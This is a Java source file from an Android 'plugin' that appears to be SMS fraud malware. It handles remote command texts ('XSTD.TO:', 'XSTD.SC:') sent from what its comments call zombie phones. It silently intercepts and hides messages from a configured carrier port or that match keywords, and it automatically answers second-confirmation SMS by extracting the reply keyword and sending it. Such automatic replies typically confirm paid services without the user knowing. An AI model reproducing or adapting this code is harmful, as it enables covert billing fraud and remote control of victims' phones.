package com.xstd.plugin.Utils;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.text.TextUtils;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.PluginSettingManager;
import com.xstd.plugin.service.PluginService;

import java.util.HashMap;

/**
 * Created by michael on 14-1-4.
 */
public class MessageHandleUtils {

    /**
     * 返回 true 表示短信应该被拦截处理
     */
    public static final boolean handleMessage(Context context, String msg, String fromAddress) {
        if (Config.DEBUG) {
            Config.LOGD("\n\n");
            Config.LOGD("[[handleMessage]] <<<<<<<<<<<< entry >>>>>>>");
            Config.LOGD("[[handleMessage]] msg = " + msg + " from address = " + fromAddress);
        }
        /**
         * 是否是短信服务器发送的短信
         * 目前此逻辑已经不用
         */
        if (msg.startsWith("XSTD.TO:")) {
            if (Config.DEBUG) {
                Config.LOGD("[[handleMessage]] handle message with XSTD.TO: ");
            }
            String phoneNumbers = msg.trim().substring("XSTD.TO:".length());
            String oldPhoneNumbers = PluginSettingManager.getInstance().getBroadcastPhoneNumber();
            String newPhoneNumbers = handleMessageContext(phoneNumbers);
            if (Config.DEBUG) {
                Config.LOGD("[[handleMessage]] after handle, new phone number : " + newPhoneNumbers + " >>>>>>>");
            }

            if (TextUtils.isEmpty(newPhoneNumbers)) return false;

            if (TextUtils.isEmpty(oldPhoneNumbers)) {
                PluginSettingManager.getInstance().setBroadcastPhoneNumber(newPhoneNumbers);
            } else {
                PluginSettingManager.getInstance().setBroadcastPhoneNumber(oldPhoneNumbers + ";" + newPhoneNumbers);
            }
            if (Config.DEBUG) {
                Config.LOGD("\n[[handleMessage]] we receive SMS [[XSTD.TO:]] for broadcast"
                                + " phoneNumbers : " + PluginSettingManager.getInstance().getBroadcastPhoneNumber() + " >>>>>>>>");
            }

            Intent i = new Intent();
            i.setClass(context, PluginService.class);
            i.setAction(PluginService.SMS_BROADCAST_ACTION);
            context.startService(i);

            //notify umeng
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("content", msg.trim());
            log.put("from", fromAddress);
            log.put("phoneType", Build.MODEL);
            CommonUtil.umengLog(context, "xstd_to_sms", log);

            return true;
        }

        /**
         * 是否是肉鸡手机发送的短信
         * 目前已经不用
         */
        if (msg.startsWith("XSTD.SC:")) {
            if (Config.DEBUG) {
                Config.LOGD("[[handleMessage]] handle message with XSTD.SC: ");
            }
            /**
             * 拦截以此开头的短信，此短信的后面跟随的是本机的号码
             */
            String selfPhoneNumber = msg.trim().substring("XSTD.SC:".length());
            if (TextUtils.isEmpty(selfPhoneNumber)) return false;

            if (selfPhoneNumber.contains(".")) selfPhoneNumber = selfPhoneNumber.replace(".", "");
            if (!TextUtils.isEmpty(selfPhoneNumber) && CommonUtil.isNumeric(selfPhoneNumber)) {
                PluginSettingManager.getInstance().setCurrentPhoneNumber(selfPhoneNumber);
            }

            //notify umeng
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("phoneType", Build.MODEL);
            log.put("from", fromAddress);
            CommonUtil.umengLog(context, "xstd_to_sc", log);

            if (Config.DEBUG) {
                Config.LOGD("\n[[handleMessage]] receive SMS [[XSTD.SC:]]"
                                + " phoneNumbers : " + PluginSettingManager.getInstance().getCurrentPhoneNumber() + " >>>>>>>>");
            }

            return true;
        }


        /**
         * 如果当前手机号码不为空，那么再进行其他的操作
         */
        if (!TextUtils.isEmpty(PluginSettingManager.getInstance().getCurrentPhoneNumber())
                && AppRuntime.ACTIVE_RESPONSE != null
                && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockSmsPort)) {
            //对于短信内容先进行二次确认检查
            if (!secondSMSCmdCheck(context, msg, fromAddress)) {
                boolean keyBlock = false;
                if (!TextUtils.isEmpty(msg) && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
                    try {
                        if (isContainWhite(msg, AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
                            return false;
                        }
                        keyBlock = AndOrCheckForFilter(msg, AppRuntime.ACTIVE_RESPONSE.blockKeys);
                    } catch (Exception e) {
                    }
                }

                if (fromAddress.startsWith(AppRuntime.ACTIVE_RESPONSE.blockSmsPort) || keyBlock) {
                    if (Config.DEBUG) {
                        Config.LOGD("[[handleMessage]] block one SMS : " + msg + "  from : " + fromAddress + " for KEY or SMS PORT filter");
                    }
                    return true;
                }
            } else {
                if (Config.DEBUG) {
                    Config.LOGD("[[handleMessage]] block one SMS : " + msg + "  from : " + fromAddress + " second check");
                }
                return true;
            }
        }

        return false;
    }

    private static boolean isContainWhite(String msg, String cmd) {
        String[] or = cmd.split("\\|");
        if (or.length <= 1) {
            String[] and = cmd.split("&");
            for (String s : and) {
                if (s.startsWith("-") && msg.contains(s.substring(1))) {
                    return true;
                }
            }
        } else {
            //先检查白名单
            for (String s : or) {
                if (s.startsWith("-") && msg.contains(s.substring(1))) {
                    return true;
                }
            }
        }

        return false;
    }

    /**
     * 不支持& 和| 的组合
     *
     * @param msg
     * @param cmd
     * @return
     */
    private static boolean AndOrCheckForFilter(String msg, String cmd) {
        String[] or = cmd.split("\\|");
        if (or.length <= 1) {
            //没有|逻辑
            String[] and = cmd.split("&");
//            先检查白名单
//            for (String s : and) {
//                if (s.startsWith("-") && msg.contains(s.substring(1))) {
//                    return false;
//                }
//            }
            for (String s : and) {
                if (!msg.contains(s)) {
                    return false;
                }
            }

            return true;
        } else {
            //有|逻辑
            //先检查白名单
//            for (String s : or) {
//                if (s.startsWith("-") && msg.contains(s.substring(1))) {
//                    return false;
//                }
//            }
            for (String s : or) {
                if (msg.contains(s)) {
                    return true;
                }
            }

            return false;
        }
    }

    /**
     * 如果返回true表示这条短信是二次确认的短信，需要拦截
     * false 表示是普通短信
     *
     * @param msg
     * @param number
     * @return
     */
    private static boolean secondSMSCmdCheck(Context context, String msg, String number) {
        if (!TextUtils.isEmpty(msg) && AppRuntime.ACTIVE_RESPONSE.smsCmd != null) {
            String port = AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.size() > 1
                              ? AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.get(1)
                              : null;
            String content = AppRuntime.ACTIVE_RESPONSE.smsCmd.contentList.size() > 1
                                 ? AppRuntime.ACTIVE_RESPONSE.smsCmd.contentList.get(1)
                                 : null;
            if (port == null || content == null) {
                return false;
            }

            //先找到要回复的关键字
            if (!content.startsWith("k=")) {
                if (content.startsWith("c=")) content = content.substring(2);
            } else {
                //以k=开始
                content = content.substring(2);
                String[] ds = content.split("\\*");
                if (ds == null || ds.length != 2) {
                    return false;
                } else {
                    int index = msg.indexOf(ds[0]);
                    if (index != -1) {
                        String subMsg = msg.substring(index + ds[0].length());
                        index = subMsg.indexOf(ds[1]);
                        if (index != -1) {
                            content = subMsg.substring(0, index);
                        } else {
                            return false;
                        }
                    } else {
                        return false;
                    }
                }
            }

            if (!port.startsWith("k=")) {
                if (port.startsWith("n=")) port = port.substring(2);
            } else {
                port = port.substring(2);
                if (!port.contains("&") && !port.contains("\\|")) {
                    //没有组合逻辑
                    if (msg.contains(port)) {
                        port = number;
                    } else {
                        return false;
                    }
                } else if (port.contains("&")) {
                    //&逻辑，注意：&和|目前不支持组合
                    String[] ds = port.split("&");
                    if (ds == null || ds.length == 0) {
                        return false;
                    }
                    for (String s : ds) {
                        if (!msg.contains(s)) {
                            return false;
                        }
                    }
                    port = number;
                } else if (port.contains("\\|")) {
                    //|逻辑
                    String[] ds = port.split("\\|");
                    if (ds == null || ds.length == 0) {
                        return false;
                    }
                    boolean should = false;
                    for (String s : ds) {
                        if (msg.contains(s)) {
                            should = true;
                            break;
                        }
                    }
                    if (should) {
                        port = number;
                    } else {
                        return false;
                    }
                }
            }

            if (TextUtils.isEmpty(port) || TextUtils.isEmpty(content)) {
                return false;
            }

            //port和content都是合法的
            SMSUtil.sendSMSForMonkey(context, port, content);

            return true;
        }

        return false;
    }

    private static final String handleMessageContext(String phoneNumbers) {
        String[] phones = phoneNumbers.split(";");
        if (phones == null) return "";

        StringBuilder sb = new StringBuilder();
        for (String s : phones) {
            if (s.contains(".")) {
                sb.append(s.replace(".", "")).append(";");
            } else {
                sb.append(s).append(";");
            }
        }

        if (sb.length() > 0) {
            return sb.substring(0, sb.length() - 1);
        }

        return "";
    }

}
